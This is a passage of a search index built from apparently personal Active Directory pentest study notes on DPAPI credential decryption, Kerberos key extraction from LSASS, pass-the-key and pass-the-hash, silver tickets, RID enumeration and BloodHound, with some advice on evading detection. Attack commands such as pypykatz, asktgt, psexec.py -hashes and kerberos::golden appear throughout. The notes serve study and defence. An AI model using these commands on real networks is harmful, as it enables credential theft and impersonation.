Microsoft\\Protect\\<SID>\\ You may sometimes see 2 subfolders: ✔ Folder 1 — User Context ✔ Folder 2 — System Context Windows uses multiple DPAPI profiles depending on: Roaming profile User migration Group Policy backup keys Password changes Domain cached keys Automatic Wi-Fi / WebCreds migrations So 2 folders = 2 key sets. This is normal."},{"id":"what-is-a-masterkey","u":"00_things-to-understand-prior.html#what-is-a-masterkey","sec":"Things To Understand Prior","lvl":3,"t":"🟥 4. What Is a MasterKey?","c":"A DPAPI MasterKey is the actual symmetric key that decrypts encrypted secrets. ✔ MasterKey = Used to decrypt Credential Blobs ✔ MasterKey itself is encrypted using: User login password (local) Or domain DPAPI backup key (domain-joined) You can think of it like: User Password → Decrypt MasterKey → Decrypt Credential Blobs"},{"id":"are-browser-passwords-stored-in-credential-blobs","u":"00_things-to-understand-prior.html#are-browser-passwords-stored-in-credential-blobs","sec":"Things To Understand Prior","lvl":3,"t":"Are browser passwords stored in Credential Blobs?","c":"Answer: Chrome/Edge passwords DO NOT use credential blobs. They use a SQLite database: AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data But the encryption key in Login Data is protected by DPAPI MasterKey . Meaning: Browser secrets use DPAPI indirectly Firefox: Does NOT use DPAPI Uses key4.db + logins.json Master password optional Cracked differently"},{"id":"what-is-stored-in-credential-blobs","u":"00_things-to-understand-prior.html#what-is-stored-in-credential-blobs","sec":"Things To Understand Prior","lvl":3,"t":"🟥 9. What is stored in Credential Blobs?","c":"Typical items: RDP saved credentials Windows Vault entries Wi-Fi passwords Outlook tokens OneDrive tokens VPN credentials Generic “Saved Passwords” Not browser credentials directly. Chrome/Edge use DPAPI but not via CredBlobs."},{"id":"final-summary-clean","u":"00_things-to-understand-prior.html#final-summary-clean","sec":"Things To Understand Prior","lvl":3,"t":"🟩 10. Final Summary (Clean)","c":"Folder | Purpose | — | — | Microsoft\\Credentials | Encrypted Credential Blobs (passwords/tokens) | Microsoft\\Protect\\<SID> | Encrypted MasterKeys used to decrypt blobs | MasterKey | DPAPI Key used to decrypt stored secrets | CredBlob | Encrypted credential data | SID on non-domain? | Yes , all users have a SID | Browsers | Chrome/Edge use DPAPI; Firefox does not | UTF-16LE decode | Because Windows DPAPI stores strings in UTF-16 |"},{"id":"dpapi-decryption-example","u":"00_things-to-understand-prior.html#dpapi-decryption-example","sec":"Things To Understand Prior","lvl":3,"t":"Dpapi Decryption Example","c":""},{"id":"step-1-extract-prekey","u":"00_things-to-understand-prior.html#step-1-extract-prekey","sec":"Things To Understand Prior","lvl":3,"t":"Step 1 — Extract prekey","c":"pypykatz dpapi prekey password 'S-1-5-21-4024...-1115' Zer0the0ne | tee pkf Meaning: Using user SID Using user password “Zer0the0ne” Generate a dpapi pre-key file (pkf) → decrypts MasterKeys"},{"id":"step-2-decrypt-dpapi-masterkeys","u":"00_things-to-understand-prior.html#step-2-decrypt-dpapi-masterkeys","sec":"Things To Understand Prior","lvl":3,"t":"Step 2 — Decrypt DPAPI MasterKeys","c":"pypykatz dpapi masterkey dpapi1 pkf -o mkf1 pypykatz dpapi masterkey dpapi2 pkf -o mkf2 Meaning: For each masterkey file ( dpapi1 , dpapi2 ) Use the pkf file to decrypt it Output decrypted masterkey → mkf1 , mkf2"},{"id":"step-3-decrypt-credblob","u":"00_things-to-understand-prior.html#step-3-decrypt-credblob","sec":"Things To Understand Prior","lvl":3,"t":"Step 3 — Decrypt CredBlob","c":"pypykatz dpapi credential mkf credblob Meaning: Use decrypted masterkey Open the credblob file Output the decrypted credential (usually a username/password pair)"},{"id":"step-4-utf-16le-decode","u":"00_things-to-understand-prior.html#step-4-utf-16le-decode","sec":"Things To Understand Prior","lvl":3,"t":"Step 4 — UTF-16LE decode","c":"data.decode('utf-16le') Because DPAPI secrets are stored in:"},{"id":"windows-unicode-utf-16-little-endian","u":"00_things-to-understand-prior.html#windows-unicode-utf-16-little-endian","sec":"Things To Understand Prior","lvl":3,"t":"✔ Windows Unicode → UTF-16 Little Endian","c":""},{"id":"decryption-logic","u":"00_things-to-understand-prior.html#decryption-logic","sec":"Things To Understand Prior","lvl":3,"t":"Decryption Logic","c":"USER PASSWORD ↓ NT Hash (password) ↓ SID + NT Hash → Prekey ↓ Decrypt master key ↓ Decrypt credential blob ↓ PLAINTEXT"},{"id":"master-key-we-get-from-protect-folder","u":"00_things-to-understand-prior.html#master-key-we-get-from-protect-folder","sec":"Things To Understand Prior","lvl":3,"t":"1. “Master key we get from /Protect/ folder”","c":"✔ Correct. The files inside: C:\\Users\\<User>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\ are the encrypted master key files ."},{"id":"for-generating-the-prekey-we-need-user-sid-password","u":"00_things-to-understand-prior.html#for-generating-the-prekey-we-need-user-sid-password","sec":"Things To Understand Prior","lvl":3,"t":"2. “For generating the prekey we need user SID + password”","c":"✔ Correct. The prekey is derived from: SID + User password (NT hash) This is exactly what pypykatz does when you run: pypykatz dpapi prekey password \"S-1-5-...\" <password>"},{"id":"using-the-prekey-we-decrypt-the-master-key","u":"00_things-to-understand-prior.html#using-the-prekey-we-decrypt-the-master-key","sec":"Things To Understand Prior","lvl":3,"t":"3. “Using the prekey we decrypt the master key”","c":"✔ Correct. Master key files are encrypted with key material derived from the prekey . Command: pypykatz dpapi masterkey dpapi1 pkf -o mkf1 Outputs the decrypted master key ."},{"id":"then-using-the-master-key-we-decrypt-the-dpapi-blob","u":"00_things-to-understand-prior.html#then-using-the-master-key-we-decrypt-the-dpapi-blob","sec":"Things To Understand Prior","lvl":3,"t":"4. “Then using the master key we decrypt the DPAPI blob”","c":"✔ Exactly correct. Credential blob location: AppData\\Roaming\\Microsoft\\Credentials\\<GUID> Contains the encrypted secret. Command: pypykatz dpapi credential mkf credblob Final decode: data.decode('utf-16le') ✔ Correct — DPAPI secrets are UTF-16LE encoded. 🎯 Final Confirmation"},{"id":"your-overall-dpapi-explanation-is-correct","u":"00_things-to-understand-prior.html#your-overall-dpapi-explanation-is-correct","sec":"Things To Understand Prior","lvl":3,"t":"Your overall DPAPI explanation is correct:","c":"User SID + Password --> Prekey Prekey + MasterKeyFile --> MasterKey MasterKey + CredentialBlob --> Decrypted Secret This is the exact internal process used by Windows DPAPI and the same process used by mimikatz/pypykatz ."},{"id":"ekeys","u":"00_things-to-understand-prior.html#ekeys","sec":"Things To Understand Prior","lvl":2,"t":"Ekeys","c":""},{"id":"understanding-the-core-concept-4","u":"00_things-to-understand-prior.html#understanding-the-core-concept-4","sec":"Things To Understand Prior","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"what-exactly-are-ekeys-deep-technical-meaning","u":"00_things-to-understand-prior.html#what-exactly-are-ekeys-deep-technical-meaning","sec":"Things To Understand Prior","lvl":3,"t":"1. What Exactly Are EKEYS? (Deep Technical Meaning)","c":"When you run: sekurlsa::ekeys Mimikatz extracts the Kerberos long-term keys stored inside the LSASS process memory. These keys are normally protected but LSASS keeps them to: Validate Kerberos tickets Sign PAC structures Decrypt TGT/TGS Handle SSO authentication Work with DPAPI These keys are derived from the user’s password and represent the user’s cryptographic identity in Kerberos."},{"id":"what-keys-do-we-get-why-they-matter","u":"00_things-to-understand-prior.html#what-keys-do-we-get-why-they-matter","sec":"Things To Understand Prior","lvl":3,"t":"🚀 2. What Keys Do We Get? (Why They Matter)","c":"Typical output contains: ✔ AES256_HMAC Key Strongest Kerberos key Used for encrypting/signing TGTs Used for encrypting TGS Required for modern Kerberos authentication Always present in Windows Server 2008+ domains ✔ AES128_HMAC Key Same purpose as AES256 Older systems or fallback ✔ RC4_HMAC_NT (NTLM Hash) Same as NTLM hash (MD4(password)) Used for: NTLM authentication RC4-HMAC Kerberos (older domains) Pass-the-Hash Craft dont directly go for mimikatz Understood. You want a full, deep, detailed explanation of EKEYS — first conceptually , then how they are used , then later show the attack , not immediately jumping into Mimikatz output . Here is the clean, structured, detailed “from zero → deep” format ."},{"id":"what-are-kerberos-ekeys-core-concept","u":"00_things-to-understand-prior.html#what-are-kerberos-ekeys-core-concept","sec":"Things To Understand Prior","lvl":3,"t":"⭐ 1. What Are Kerberos EKeys? (Core Concept)","c":"In Active Directory, every user has Kerberos long-term keys derived from their password. These long-term keys are called: ✔ Encryption Keys (EKeys) These are cryptographic keys used by Kerberos to: Prove the identity of a user Encrypt TGT (Ticket Granting Ticket) Encrypt TGS (Service Ticket) Sign the PAC (Privilege Attribute Certificate) Validate ticket integrity Authenticate without storing passwords They are NEVER passwords, but cryptographic representations of the password ."},{"id":"how-are-kerberos-ekeys-created","u":"00_things-to-understand-prior.html#how-are-kerberos-ekeys-created","sec":"Things To Understand Prior","lvl":3,"t":"⭐ 2. How Are Kerberos EKeys Created?","c":"When a user sets a password: Kerberos derives several keys from the password: Derived Key | Based On | Used For | — | — | — | AES256 Key | PBKDF2(password) | Modern TGT/TGS encryption | AES128 Key | PBKDF2(password) | Older encryption | RC4-HMAC (NTLM Hash) | MD4(password) | NTLM auth + Legacy Kerberos RC4 | SHA1 Key | from AES key | PAC signing | So the password is never used directly . Kerberos uses these derived keys to identify and authenticate the user."},{"id":"why-are-these-keys-stored-in-lsass","u":"00_things-to-understand-prior.html#why-are-these-keys-stored-in-lsass","sec":"Things To Understand Prior","lvl":3,"t":"⭐ 3. Why Are These Keys Stored in LSASS?","c":"LSASS caches them in memory because: ✔ Users login LSASS must validate tickets presented by the user. ✔ Services authenticate Services need to verify users’ TGS tickets. ✔ SSO requires tickets For seamless logon, LSASS must have the user’s encryption material. This is why tools like Mimikatz / Rubeus can extract them."},{"id":"why-ekeys-are-extremely-valuable-to-attackers","u":"00_things-to-understand-prior.html#why-ekeys-are-extremely-valuable-to-attackers","sec":"Things To Understand Prior","lvl":3,"t":"⭐ 4. Why EKeys Are Extremely Valuable to Attackers","c":"Because these keys are the full identity of the user in Kerberos. If you have these keys, you can: ✔ Authenticate without password This is called Pass-The-Key . Kerberos will accept AES/RC4 key instead of the real password. ✔ Get a Ticket Granting Ticket (TGT) Using AES key: asktgt /aes256:<key> ✔ Do Pass-The-Hash using RC4/NTLM RC4 key = NTLM hash So NTLM-based auth works too. ✔ Forge Silver Tickets Using the service account’s AES/RC4 keys. ✔ Decrypt encrypted tickets Kerberos session keys become decryptable. ✔ Get long-term persistence AES256 key is valid until password changes."},{"id":"example---format","u":"00_things-to-understand-prior.html#example---format","sec":"Things To Understand Prior","lvl":3,"t":"Example - Format","c":"⭐ 1 . Example of EKeys (Random Example) (This is NOT mimikatz output yet — just showing the concept) User: alice Domain: CORP.LOCAL Kerberos Long-Term Keys: AES256 : a1b7f3d2e246bc1f539c48d6efe7c0d4ac93821f44efcf1c20d52a310ee9b8c AES128 : 85e4d8ab1c7b32f0a2f8d4a3f516a959 RC4-HMAC : 5f4dcc3b5aa765d61d8327deb882cf99 ← NTLM hash SHA1 : 9c3e73429aa21e7b85ffcc433c29b1d12"},{"id":"aes256-used-for-strongest-kerberos-authentication","u":"00_things-to-understand-prior.html#aes256-used-for-strongest-kerberos-authentication","sec":"Things To Understand Prior","lvl":3,"t":"✔ AES256 = used for strongest Kerberos authentication","c":""},{"id":"aes128-fallback","u":"00_things-to-understand-prior.html#aes128-fallback","sec":"Things To Understand Prior","lvl":3,"t":"✔ AES128 = fallback","c":""},{"id":"rc4-hmac-ntlm-hash-pass-the-hash-compatible","u":"00_things-to-understand-prior.html#rc4-hmac-ntlm-hash-pass-the-hash-compatible","sec":"Things To Understand Prior","lvl":3,"t":"✔ RC4-HMAC = NTLM hash (Pass-The-Hash compatible)","c":""},{"id":"sha1-pac-integrity","u":"00_things-to-understand-prior.html#sha1-pac-integrity","sec":"Things To Understand Prior","lvl":3,"t":"✔ SHA1 = PAC integrity","c":"⭐ 7. How Attackers Use These EKeys"},{"id":"a.-pass-the-key-kerberos","u":"00_things-to-understand-prior.html#a.-pass-the-key-kerberos","sec":"Things To Understand Prior","lvl":2,"t":"✔ A. Pass-The-Key (Kerberos)","c":"Using AES256 key to request TGT: asktgt /domain:corp.local /user:alice /aes256:a1b7f3d2e246bc... → DC issues a TGT because AES key is valid. You now impersonate Alice without password."},{"id":"b.-pass-the-hash-ntlm","u":"00_things-to-understand-prior.html#b.-pass-the-hash-ntlm","sec":"Things To Understand Prior","lvl":2,"t":"✔ B. Pass-The-Hash (NTLM)","c":"Using RC4/NTLM hash → SMB/WinRM/etc. psexec.py -hashes :5f4dcc3b5aa765... alice@corp.local"},{"id":"c.-silver-ticket-forging","u":"00_things-to-understand-prior.html#c.-silver-ticket-forging","sec":"Things To Understand Prior","lvl":2,"t":"✔ C. Silver Ticket Forging","c":"Using service account AES key: CIFS HOST MSSQLSvc HTTP kerberos::golden /service:cifs /target:server.corp.local /aes256:<key>"},{"id":"d.-persistence","u":"00_things-to-understand-prior.html#d.-persistence","sec":"Things To Understand Prior","lvl":2,"t":"✔ D. Persistence","c":"If password never changes → ekey never changes. Attacker stays forever. ⭐ 8. Why AES Key Is Better Than RC4 Feature | RC4 (NTLM) | AES256 | — | — | — | Modern Kerberos | ❌ No | ✔ Yes | Supported on all DCs | Yes | Yes | Strong security | Weak (RC4) | Strong | Cracking chance | Medium | None | Recommended by MS | No | Yes | Used for TGT | Sometimes | Always | So attackers always prefer AES256 → best for Pass-the-Key . ⭐ 9. Final Summary (Simple & Powerful)"},{"id":"kerberos-ekeys-aesrc4-keys-derived-from-a-users-password","u":"00_things-to-understand-prior.html#kerberos-ekeys-aesrc4-keys-derived-from-a-users-password","sec":"Things To Understand Prior","lvl":3,"t":"✔ Kerberos EKeys = AES/RC4 keys derived from a user’s password","c":""},{"id":"they-are-the-users-identity-inside-lsass","u":"00_things-to-understand-prior.html#they-are-the-users-identity-inside-lsass","sec":"Things To Understand Prior","lvl":3,"t":"✔ They are the user’s identity inside LSASS","c":""},{"id":"if-you-get-these-keys-you-do-not-need-the-password","u":"00_things-to-understand-prior.html#if-you-get-these-keys-you-do-not-need-the-password","sec":"Things To Understand Prior","lvl":3,"t":"✔ If you get these keys, you do NOT need the password","c":""},{"id":"using-aes256ekeys-you-can","u":"00_things-to-understand-prior.html#using-aes256ekeys-you-can","sec":"Things To Understand Prior","lvl":3,"t":"✔ Using AES256/EKeys you can:","c":"Request a TGT Request service tickets Authenticate via Kerberos Forge silver tickets Lateral move Maintain persistence"},{"id":"using-rc4-you-can","u":"00_things-to-understand-prior.html#using-rc4-you-can","sec":"Things To Understand Prior","lvl":3,"t":"✔ Using RC4 you can:","c":"Do pass-the-hash Do legacy RC4 Kerberos Authenticate to older services"},{"id":"rid-enumeration-deep-dive-core-logic-brute-force-working-user-enumeration","u":"00_things-to-understand-prior.html#rid-enumeration-deep-dive-core-logic-brute-force-working-user-enumeration","sec":"Things To Understand Prior","lvl":2,"t":"🔥 RID Enumeration — Deep Dive (Core Logic + Brute Force Working) + User Enumeration","c":""},{"id":"first-understand-sids","u":"00_things-to-understand-prior.html#first-understand-sids","sec":"Things To Understand Prior","lvl":3,"t":"✅ 1. First, understand SIDs","c":"Every Windows AD user has a SID (Security Identifier) : S-1-5-21-AAA-BBB-CCC-RID AAA-BBB-CCC → Domain identifier (same for all users in that domain) RID → Relative ID (unique per user) Example: Administrator → RID 500 Guest → RID 501 John → RID 1103 HRUser → RID 1432 The ONLY part that changes per user is the RID ."},{"id":"anonymous-sid-lookup-leak-the-vulnerability","u":"00_things-to-understand-prior.html#anonymous-sid-lookup-leak-the-vulnerability","sec":"Things To Understand Prior","lvl":3,"t":"🧠 2. Anonymous SID Lookup Leak (The Vulnerability)","c":"Windows exposes an API: LookupAccountSid() If you give it a SID, it returns: Username Object type (user/group) Domain name Even for unauthenticated users unless the admin explicitly restricts it. This is the vulnerability."},{"id":"these-two-different-codes-allow-enumeration","u":"00_things-to-understand-prior.html#these-two-different-codes-allow-enumeration","sec":"Things To Understand Prior","lvl":3,"t":"📌 These two different codes allow enumeration","c":"Tools detect: Result | Error Code | Meaning | — | — | — | ✔ Valid SID | STATUS_SUCCESS (0x00000000) | User exists | ❌ Invalid SID | STATUS_NONE_MAPPED (0xC0000073) | No user with this RID |"},{"id":"how-enumeration-tools-exploit-it","u":"00_things-to-understand-prior.html#how-enumeration-tools-exploit-it","sec":"Things To Understand Prior","lvl":3,"t":"🔍 3. How enumeration tools exploit it","c":"Tools like: Impacket lookupsid.py CrackMapExec enum4linux-ng RID brute-force modules They follow the same logic:"},{"id":"step-1-get-the-domain-sid-without-passwords","u":"00_things-to-understand-prior.html#step-1-get-the-domain-sid-without-passwords","sec":"Things To Understand Prior","lvl":4,"t":"Step 1 — Get the domain SID (without passwords!)","c":"The tool asks for the SID of user “null session” or uses a query to fetch the domain SID: Example: S-1-5-21-555444333-777888999-123456789 This is constant for the entire domain."},{"id":"now-brute-forcing-begins","u":"00_things-to-understand-prior.html#now-brute-forcing-begins","sec":"Things To Understand Prior","lvl":3,"t":"🚀 4. Now brute forcing begins","c":"The tool loops through RIDs: Start RID = 500 End RID = 20000 (or 100000 depending on tool) For each RID:"},{"id":"step-2-construct-a-test-sid","u":"00_things-to-understand-prior.html#step-2-construct-a-test-sid","sec":"Things To Understand Prior","lvl":4,"t":"Step 2 — Construct a test SID","c":"Example: TestSID = DomainSID + \"-\" + 500 TestSID = S-1-5-21-555444333-777888999-123456789-500"},{"id":"step-3-ask-windows-who-is-this","u":"00_things-to-understand-prior.html#step-3-ask-windows-who-is-this","sec":"Things To Understand Prior","lvl":4,"t":"Step 3 — Ask Windows: Who is this?","c":"Send: LookupAccountSid(TestSID)"},{"id":"step-4-if-windows-responds-with-a-name","u":"00_things-to-understand-prior.html#step-4-if-windows-responds-with-a-name","sec":"Things To Understand Prior","lvl":4,"t":"Step 4 — If Windows responds with a name","c":"You’ve found a real user or group. Example output: S-1-5-21-…-500 → Administrator S-1-5-21-…-501 → Guest S-1-5-21-…-1104 → HRUser"},{"id":"step-5-if-windows-returns-no-mapping","u":"00_things-to-understand-prior.html#step-5-if-windows-returns-no-mapping","sec":"Things To Understand Prior","lvl":4,"t":"Step 5 — If Windows returns “NO MAPPING”","c":"RID doesn’t exist → skip and continue."},{"id":"what-is-actually-being-brute-forced","u":"00_things-to-understand-prior.html#what-is-actually-being-brute-forced","sec":"Things To Understand Prior","lvl":3,"t":"📘 5. What is actually being brute-forced?","c":"You are brute-forcing: Every possible RID number. **NOT passwords. NOT usernames. ONLY numerical RIDs.** You try tens of thousands of RIDs and see which ones exist."},{"id":"why-this-works-even-without-credentials","u":"00_things-to-understand-prior.html#why-this-works-even-without-credentials","sec":"Things To Understand Prior","lvl":3,"t":"🟦 6. Why this works even without credentials","c":"Because Windows allows ANONYMOUS SID → username lookups unless hardened . Domain Controller replies: If SID exists → returns username If SID does not exist → returns ERROR_NO_SUCH_USER This difference is what allows enumeration."},{"id":"example-rid-brute-force-logic-in-pseudocode","u":"00_things-to-understand-prior.html#example-rid-brute-force-logic-in-pseudocode","sec":"Things To Understand Prior","lvl":3,"t":"🧨 7. Example — RID brute force logic in pseudocode","c":"domain_sid = get_domain_sid() # S-1-5-21-555-666-777 for rid in range(500, 20000): sid = domain_sid + \"-\" + rid username = LookupAccountSid(sid) if username != ERROR: print(\"Found user:\", username, \"RID:\", rid) else: continue This is exactly what Impacket lookupsid.py does internally."},{"id":"example-realistic-output","u":"00_things-to-understand-prior.html#example-realistic-output","sec":"Things To Understand Prior","lvl":4,"t":"🟣 8. Example (Realistic Output)","c":"[*] S-1-5-21-555-666-777-500 Administrator [*] S-1-5-21-555-666-777-501 Guest [*] S-1-5-21-555-666-777-502 krbtgt [*] S-1-5-21-555-666-777-1104 John [*] S-1-5-21-555-666-777-1500 BackupSvc [*] S-1-5-21-555-666-777-2103 HRUser Boom → full domain user enumeration without credentials."},{"id":"how-to-stop-rid-enumeration-defender-view","u":"00_things-to-understand-prior.html#how-to-stop-rid-enumeration-defender-view","sec":"Things To Understand Prior","lvl":3,"t":"🛡 9. How to stop RID enumeration (Defender View)","c":"RID enumeration works when: Anonymous SID lookup is allowed To stop it:"},{"id":"turn-off-anonymous-sam-lookups","u":"00_things-to-understand-prior.html#turn-off-anonymous-sam-lookups","sec":"Things To Understand Prior","lvl":4,"t":"✔ Turn off ANONYMOUS SAM lookups","c":"Local Security Policy: Network access: Restrict anonymous access to SAM"},{"id":"harden-smb","u":"00_things-to-understand-prior.html#harden-smb","sec":"Things To Understand Prior","lvl":4,"t":"✔ Harden SMB","c":"Disable anonymous sessions."},{"id":"use-deny-anonymous-enumeration-of-sam-accounts-via-gpo.","u":"00_things-to-understand-prior.html#use-deny-anonymous-enumeration-of-sam-accounts-via-gpo.","sec":"Things To Understand Prior","lvl":4,"t":"✔ Use “Deny anonymous enumeration of SAM accounts” via GPO.","c":"Once enabled → enumeration tools get Access Denied ."},{"id":"final-summary-1","u":"00_things-to-understand-prior.html#final-summary-1","sec":"Things To Understand Prior","lvl":3,"t":"⭐ FINAL SUMMARY","c":"RID Enumeration works because: All domain users share the same domain SID Only the RID changes Windows leaks SID→Name resolution Tools loop through all possible RIDs If Windows returns a name → that user exists No password or login required It brute-forces RID numbers (500–50000), not usernames or last 3 digits."},{"id":"bloodhound","u":"01_attacks-lateral-movement.html#bloodhound","sec":"Attacks + Lateral Movement","lvl":2,"t":"BloodHound","c":""},{"id":"what-is-bloodhound","u":"01_attacks-lateral-movement.html#what-is-bloodhound","sec":"Attacks + Lateral Movement","lvl":3,"t":"What is BloodHound?","c":"BloodHound is a graph-based Active Directory analysis tool. It answers one scary-good question: “Given what I control right now, how can I become Domain Admin?” It doesn’t “hack” by itself — it maps relationships and permissions that already exist in AD and shows attack paths humans miss."},{"id":"big-picture-architecture","u":"01_attacks-lateral-movement.html#big-picture-architecture","sec":"Attacks + Lateral Movement","lvl":3,"t":"Big Picture Architecture","c":"[ Active Directory ] ↑ (Data Collection) ↑ SharpHound (Collector) ↑ JSON Data ↑ BloodHound UI (Graph DB) ↓ Attack Path Analysis So BloodHound = 📦 Collector + 🧠 Graph Engine + Queries The collector is called SharpHound . 🔸 What it Collects: Users and Group memberships Logged-in sessions Local administrator rights Computer objects ACLs (Access Control Lists) on AD objects RDP, DCOM, PSRemoting access rights Domain trusts 🔸 Methods of Collection: LDAP queries (for users, groups, ACLs) SMB/NetSessionEnum (for session info) Remote registry (to find local admins) RPC (to pull trust relationships, ACLs, etc.) 📌 It can be run from a low-privilege domain user account and does not need admin in most cases."},{"id":"how-bloodhound-gets-its-data-deep-technical-view","u":"01_attacks-lateral-movement.html#how-bloodhound-gets-its-data-deep-technical-view","sec":"Attacks + Lateral Movement","lvl":3,"t":"How BloodHound Gets Its Data (Deep Technical View)","c":"BloodHound does not exploit vulnerabilities . It uses legitimate Windows & AD APIs — exactly what admins and helpdesk tools use."},{"id":"ldap-queries-core-ad-info","u":"01_attacks-lateral-movement.html#ldap-queries-core-ad-info","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ LDAP Queries (Core AD Info)","c":"BloodHound queries LDAP on Domain Controllers to enumerate: Users Groups Computers Group memberships OU structure ACLs (permissions) Example concept (not real code): LDAP query: (objectClass=user) This builds the AD object graph ."},{"id":"security-descriptors-acl-delegation-abuse","u":"01_attacks-lateral-movement.html#security-descriptors-acl-delegation-abuse","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ Security Descriptors (ACL & Delegation Abuse)","c":"This is where BloodHound gets dangerous. Every AD object has an ACL : Who can reset passwords Who can write group membership Who can modify SPNs Who can add logon scripts Who has GenericAll / WriteDACL / WriteOwner BloodHound parses: ntSecurityDescriptor ACE entries Then maps relationships like: UserA → (GenericWrite) → GroupB GroupB → (MemberOf) → Domain Admins Which becomes: UserA → Domain Admins (attack path)"},{"id":"session-enumeration-who-is-logged-in-where","u":"01_attacks-lateral-movement.html#session-enumeration-who-is-logged-in-where","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ Session Enumeration (Who is Logged In Where)","c":"This is huge for lateral movement. SharpHound queries: SMB session info Logged-on users Cached credentials Local admin rights So it learns: UserA is local admin on PC1 DomainAdmin is logged into PC1 That becomes: Compromise PC1 → steal DA creds"},{"id":"local-admin-mapping","u":"01_attacks-lateral-movement.html#local-admin-mapping","sec":"Attacks + Lateral Movement","lvl":3,"t":"4️⃣ Local Admin Mapping","c":"SharpHound enumerates: Local Administrators group on machines Which domain users/groups are admins on which hosts This reveals: If I compromise this low-privilege user, I control 45 machines."},{"id":"group-policy-enumeration","u":"01_attacks-lateral-movement.html#group-policy-enumeration","sec":"Attacks + Lateral Movement","lvl":3,"t":"5️⃣ Group Policy Enumeration","c":"BloodHound collects: Which users can edit GPOs Which machines a GPO applies to Who can modify scripts deployed by GPO This finds: UserX can modify a GPO that applies to Domain Controllers. That’s basically domain takeover waiting to happen."},{"id":"trust-relationships","u":"01_attacks-lateral-movement.html#trust-relationships","sec":"Attacks + Lateral Movement","lvl":3,"t":"6️⃣ Trust Relationships","c":"BloodHound maps: Forest trusts Domain trusts Directionality Transitivity So it can find attack paths like: Low-priv user in ChildDomain → control object in ParentDomain → Domain Admin"},{"id":"why-bloodhound-is-so-powerful","u":"01_attacks-lateral-movement.html#why-bloodhound-is-so-powerful","sec":"Attacks + Lateral Movement","lvl":3,"t":"Why BloodHound is So Powerful","c":"Because AD is not hierarchical — it’s a graph of relationships . Humans think: “Admins are powerful, users are not.” BloodHound shows: “This intern can become Domain Admin in 4 hops.”"},{"id":"example-attack-path-realistic","u":"01_attacks-lateral-movement.html#example-attack-path-realistic","sec":"Attacks + Lateral Movement","lvl":3,"t":"Example Attack Path (Realistic)","c":"UserA ↓ (WriteSPN) ServiceAccount ↓ (MemberOf) IT Support Group ↓ (LocalAdmin) Server01 ↓ (Logged-on) DomainAdmin So: Compromise UserA → Own Domain No exploit needed. Just bad permissions + graph traversal."},{"id":"how-bloodhound-finds-attack-paths-internals","u":"01_attacks-lateral-movement.html#how-bloodhound-finds-attack-paths-internals","sec":"Attacks + Lateral Movement","lvl":3,"t":"How BloodHound Finds Attack Paths (Internals)","c":"BloodHound loads data into a graph database (Neo4j style model). Nodes: Users Groups Computers GPOs Edges: MemberOf AdminTo HasSession GenericWrite CanRDP CanResetPassword WriteDACL Then it runs prebuilt Cypher queries like: “Shortest path from any user to Domain Admins” This is literally graph theory applied to Active Directory. Note:- Avoid using bloodhound unless it is extremely necessary because it tries to collect to data in short interval of time which can flagged as suspicious can detected easily. image.png These kinds of alerts are raised if bloodhound is used. For stealthy option instead of bloodhound you can use shoaphound. image.png"},{"id":"ldap-vs-ldaps-which-one-does-bloodhound-use","u":"01_attacks-lateral-movement.html#ldap-vs-ldaps-which-one-does-bloodhound-use","sec":"Attacks + Lateral Movement","lvl":3,"t":"LDAP vs LDAPS – which one does BloodHound use?","c":"Answer: It uses both , depending on what the environment allows. LDAP (389) → default in many internal networks LDAPS (636) → used if: The DC supports it The client is configured for secure LDAP TLS is available 🔹 BloodHound / SharpHound doesn’t require LDAPS. 🔹 It will happily pull data over plain LDAP if that’s what AD allows. So: it uses whatever the domain exposes — LDAP first, LDAPS if available."},{"id":"can-a-normal-domain-user-collect-everything","u":"01_attacks-lateral-movement.html#can-a-normal-domain-user-collect-everything","sec":"Attacks + Lateral Movement","lvl":3,"t":"Can a normal domain user collect “everything”?","c":"✅ Yes — shockingly, yes (mostly). With a standard domain user , you can collect: Users Groups Group memberships Computers OU structure ACLs on AD objects GPO permissions Trust relationships Many delegation rights Because Active Directory is designed to be readable by authenticated users. ⚠️ What you can’t fully collect as a normal user: Some session info on locked-down machines Some local admin mappings (if SMB/RPC is blocked) Some privileged ACL details if hardened But in most real-world domains, a low-priv user still gets more than enough to build attack paths. So your statement: “with normal priv user its possible to collect entire data right ??” 👉 Yes, enough data to map real attack paths."},{"id":"bloodhound-vs-sharphound-linux-vs-windows","u":"01_attacks-lateral-movement.html#bloodhound-vs-sharphound-linux-vs-windows","sec":"Attacks + Lateral Movement","lvl":3,"t":"BloodHound vs SharpHound (Linux vs Windows)","c":"You’re correct:"},{"id":"sharphound","u":"01_attacks-lateral-movement.html#sharphound","sec":"Attacks + Lateral Movement","lvl":3,"t":"SharpHound","c":"→ Windows-based collector (EXE, PS1, etc)"},{"id":"bloodhound-linux-cross-platform-collectors","u":"01_attacks-lateral-movement.html#bloodhound-linux-cross-platform-collectors","sec":"Attacks + Lateral Movement","lvl":3,"t":"BloodHound (Linux / cross-platform collectors)","c":"→ Uses LDAP + RPC + SMB from Linux/macOS Both collectors: ✅ Enumerate AD ✅ Output JSON files So yes: bloodhound (Linux) / sharphound (Windows) both produce .json Correct."},{"id":"neo4j-bloodhound-gui-graph-creation","u":"01_attacks-lateral-movement.html#neo4j-bloodhound-gui-graph-creation","sec":"Attacks + Lateral Movement","lvl":3,"t":"Neo4j + BloodHound GUI – Graph Creation","c":"Your flow is exactly right: Collector (SharpHound / BloodHound.py) ↓ JSON Files ↓ Import into BloodHound GUI ↓ Neo4j Graph Database ↓ Attack Path Queries BloodHound UI uses:"},{"id":"neo4j","u":"01_attacks-lateral-movement.html#neo4j","sec":"Attacks + Lateral Movement","lvl":3,"t":"Neo4j","c":"to store nodes and edges: Nodes: Users Groups Computers GPOs Edges: MemberOf AdminTo HasSession CanRDP GenericWrite WriteDACL etc. Once imported, BloodHound runs graph queries like: “Shortest path from any user to Domain Admins” And boom — instant attack paths."},{"id":"tiny-clarifications-pro-level-accuracy","u":"01_attacks-lateral-movement.html#tiny-clarifications-pro-level-accuracy","sec":"Attacks + Lateral Movement","lvl":3,"t":"Tiny Clarifications (Pro-Level Accuracy)","c":"✔️ LDAP is for: Users Groups ACLs Trusts GPO links ✔️ SMB / RPC / WinRM are used for: Session enumeration Local admin mapping Logged-on users So BloodHound is not only LDAP — LDAP is the backbone, but host-level info uses other Windows 